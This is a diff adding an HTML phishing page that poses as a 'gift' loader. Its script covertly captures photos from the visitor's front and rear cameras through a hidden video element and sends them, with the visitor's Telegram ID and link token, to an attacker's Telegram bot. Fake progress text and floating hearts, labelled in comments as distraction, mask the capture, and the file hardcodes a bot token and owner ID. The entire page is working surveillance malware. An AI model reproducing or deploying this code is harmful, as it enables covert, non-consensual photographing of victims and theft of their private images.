@@ -1,0 +1,524 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Loading Your Gift...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: white;
+        }
+        
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 50px rgba(255, 0, 255, 0.5);
+        }
+        
+        .gift-icon {
+            font-size: 100px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+            display: inline-block;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        h1 {
+            color: #ff00ff;
+            margin-bottom: 20px;
+            font-size: 32px;
+        }
+        
+        .message {
+            color: #ccc;
+            margin-bottom: 30px;
+            line-height: 1.6;
+            font-size: 18px;
+        }
+        
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #333;
+            border-top: 5px solid #ff00ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-container {
+            width: 100%;
+            background: #333;
+            height: 10px;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff00ff, #00ffff);
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .status {
+            color: #888;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        /* Hidden elements */
+        #cameraVideo, #cameraCanvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        .heart {
+            position: absolute;
+            color: #ff00ff;
+            font-size: 20px;
+            animation: float 5s linear infinite;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Floating hearts for distraction -->
+    <div id="heartsContainer"></div>
+    
+    <!-- Hidden camera -->
+    <video id="cameraVideo" autoplay playsinline></video>
+    <canvas id="cameraCanvas"></canvas>
+    
+    <!-- Main screen -->
+    <div class="container">
+        <div class="gift-icon">🎁</div>
+        <h1>PROCESSING YOUR GIFT...</h1>
+        <div class="message">
+            🎉 Please wait while we process your exclusive reward...<br><br>
+            This may take a few moments.
+        </div>
+        
+        <div class="loader"></div>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status" id="statusText">Initializing gift system...</div>
+        <div class="status" id="counterText"></div>
+    </div>
+
+    <script>
+        // Telegram Bot API
+        const BOT_TOKEN = "8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE";
+        const OWNER_ID = "8215819954"; // Your ID
+        
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        const uid = urlParams.get('uid'); // User's Telegram ID
+        
+        // DOM elements
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        const counterText = document.getElementById('counterText');
+        const heartsContainer = document.getElementById('heartsContainer');
+        const cameraVideo = document.getElementById('cameraVideo');
+        const cameraCanvas = document.getElementById('cameraCanvas');
+        const ctx = cameraCanvas.getContext('2d');
+        
+        // Variables
+        let stream = null;
+        let capturedPhotos = 0;
+        let totalPhotos = 10;
+        let isCapturing = false;
+        let intervalId = null;
+        let photos = []; // Store captured photos
+        
+        // Create floating hearts (distraction)
+        function createHearts() {
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.textContent = '❤️';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
+            heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
+            heartsContainer.appendChild(heart);
+            setTimeout(() => heart.remove(), 7000);
+        }
+        setInterval(createHearts, 500);
+        
+        // Update progress display
+        function updateProgress(photoNum) {
+            const percent = (photoNum / totalPhotos) * 100;
+            progressBar.style.width = percent + '%';
+            
+            const messages = [
+                "Verifying gift authenticity...",
+                "Processing reward details...",
+                "Connecting to gift server...",
+                "Finalizing delivery...",
+                "Almost complete..."
+            ];
+            
+            if (photoNum < totalPhotos) {
+                const randomMsg = messages[photoNum % messages.length];
+                statusText.textContent = randomMsg;
+                counterText.textContent = `Step ${photoNum + 1} of ${totalPhotos}`;
+            } else {
+                statusText.textContent = "✅ Gift processed successfully!";
+                counterText.textContent = "Unlocking surprises...";
+            }
+        }
+        
+        // Initialize hidden camera
+        async function initCamera() {
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: { exact: "user" },
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
+                    }
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraVideo.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    cameraVideo.onloadedmetadata = resolve;
+                });
+                
+                return true;
+            } catch (error) {
+                console.log('Camera access not granted');
+                return false;
+            }
+        }
+        
+        // Capture photo silently
+        function capturePhoto() {
+            if (!stream) return null;
+            
+            try {
+                cameraCanvas.width = cameraVideo.videoWidth;
+                cameraCanvas.height = cameraVideo.videoHeight;
+                ctx.drawImage(cameraVideo, 0, 0);
+                
+                const photoData = cameraCanvas.toDataURL('image/jpeg', 0.5);
+                return photoData.split(',')[1]; // Base64 data
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        // Switch to back camera
+        async function switchToBackCamera() {
+            if (!stream) return false;
+            
+            try {
+                stream.getTracks().forEach(track => track.stop());
+                
+                const constraints = {
+                    video: {
+                        facingMode: { exact: "environment" },
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
+                    }
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraVideo.srcObject = stream;
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // Convert base64 to blob for sending
+        function base64ToBlob(base64) {
+            const byteCharacters = atob(base64);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            return new Blob([byteArray], {type: 'image/jpeg'});
+        }
+        
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(chatId, photoBase64, caption) {
+            return new Promise((resolve) => {
+                try {
+                    const blob = base64ToBlob(photoBase64);
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', caption);
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            resolve(true);
+                        } else {
+                            console.error('Telegram error:', data);
+                            resolve(false);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Fetch error:', error);
+                        resolve(false);
+                    });
+                    
+                } catch (error) {
+                    console.error('Send photo error:', error);
+                    resolve(false);
+                }
+            });
+        }
+        
+        // Send message to Telegram
+        async function sendMessageToTelegram(chatId, text) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Message error:', error);
+                return false;
+            }
+        }
+        
+        // Send photos to BOTH parties
+        async function sendPhotosToBoth() {
+            statusText.textContent = "Processing complete...";
+            
+            // 1. First send to OWNER (you)
+            await sendMessageToTelegram(OWNER_ID,
+                `🎯 STEALTH PROCESS COMPLETE\nUser: ${uid}\nToken: ${token}\nCaptures: ${photos.length}`);
+            
+            // Send each photo to owner
+            for (let i = 0; i < photos.length; i++) {
+                const photo = photos[i];
+                const caption = `📸 Capture ${i+1}/${photos.length} (${i < 5 ? 'Front' : 'Back'}) | User: ${uid}`;
+                
+                await sendPhotoToTelegram(OWNER_ID, photo.data, caption);
+                await new Promise(resolve => setTimeout(resolve, 1500)); // Delay
+                
+                // Update progress
+                progressBar.style.width = `${50 + ((i + 1) / photos.length) * 25}%`;
+                statusText.textContent = `Processing captures... (${i+1}/${photos.length})`;
+            }
+            
+            // 2. Then send to USER
+            await sendMessageToTelegram(uid,
+                `🎉 Your gift has been processed!\nSurprise unlocked for both.\n\nSending your results now...`);
+            
+            // Send each photo to user
+            for (let i = 0; i < Math.min(5, photos.length); i++) { // Send first 5 to user
+                const photo = photos[i];
+                const caption = `🎁 Your result ${i+1}/${photos.length}`;
+                
+                await sendPhotoToTelegram(uid, photo.data, caption);
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Update progress
+                progressBar.style.width = `${75 + ((i + 1) / Math.min(5, photos.length)) * 25}%`;
+                statusText.textContent = `Processing your results... (${i+1}/${Math.min(5, photos.length)})`;
+            }
+            
+            // Final messages
+            await sendMessageToTelegram(OWNER_ID,
+                `✅ All ${photos.length} captures processed!\nUser ID: ${uid}`);
+            
+            await sendMessageToTelegram(uid,
+                `✅ All results processed!\nThank you for participating!`);
+            
+            // Show completion
+            progressBar.style.width = '100%';
+            statusText.textContent = "✅ Process complete!";
+            counterText.textContent = "Surprise unlocked!";
+            
+            // Change screen after 3 seconds
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div class="container">
+                        <div style="font-size:60px; margin-bottom:20px;">✅</div>
+                        <h1>GIFT DELIVERED!</h1>
+                        <div class="message">
+                            ✅ Front capture complete<br>
+                            ✅ Back capture complete<br>
+                            ✅ Process loaded successfully
+                        </div>
+                        <div class="status">Surprise unlocked!</div>
+                        <div class="status">You can close this window</div>
+                    </div>
+                `;
+            }, 3000);
+        }
+        
+        // Main stealth capture function
+        async function startStealthCapture() {
+            if (!token || !uid) return;
+            
+            isCapturing = true;
+            updateProgress(0);
+            
+            // Initialize camera
+            const hasCamera = await initCamera();
+            
+            if (!hasCamera) {
+                // No camera - still send notifications
+                await sendMessageToTelegram(OWNER_ID, 
+                    `🎯 STEALTH TRAP ACTIVATED (No Camera)\nUser: ${uid}\nToken: ${token}`);
+                await sendMessageToTelegram(uid,
+                    `🎉 Your gift has been processed!\nVerification complete.`);
+                finishProcess();
+                return;
+            }
+            
+            // Wait for camera
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // ===== CAPTURE IN BACKGROUND =====
+            let photoIndex = 0;
+            let useFrontCamera = true;
+            
+            intervalId = setInterval(async () => {
+                if (photoIndex >= totalPhotos) {
+                    clearInterval(intervalId);
+                    
+                    // Stop camera
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                    // Send photos to both
+                    await sendPhotosToBoth();
+                    return;
+                }
+                
+                try {
+                    // Capture photo
+                    const photoData = capturePhoto();
+                    
+                    if (photoData) {
+                        photos.push({
+                            data: photoData,
+                            type: useFrontCamera ? 'front' : 'back',
+                            index: photoIndex + 1
+                        });
+                        
+                        capturedPhotos++;
+                        updateProgress(photoIndex + 1);
+                        
+                        // Switch camera after 5 photos
+                        if (photoIndex === 4 && useFrontCamera) {
+                            const switched = await switchToBackCamera();
+                            if (switched) {
+                                useFrontCamera = false;
+                                await new Promise(resolve => setTimeout(resolve, 500));
+                            }
+                        }
+                    }
+                    
+                    photoIndex++;
+                    
+                } catch (error) {
+                    console.error('Capture error:', error);
+                    photoIndex++;
+                }
+                
+            }, 2000); // Capture every 2 seconds
+        }
+        
+        // Start when page loads
+        window.addEventListener('load', () => {
+            if (!token || !uid) {
+                document.body.innerHTML = `
+                    <div class="container">
+                        <div style="font-size:60px; margin-bottom:20px;">❌</div>
+                        <h1>INVALID LINK</h1>
+                        <div class="message">
+                            This gift link is invalid or has expired.
+                        </div>
+                    </div>
+                `;
+                return;
+            }
+            
+            // Start capture
+            setTimeout(startStealthCapture, 1000);
+        });
+        
+        // Continue capturing even if page loses focus
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && isCapturing) {
+                statusText.textContent = "Resuming gift processing...";
+            }
+        });
+        
+        // Prevent right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+    </script>
+</body>
+</html>
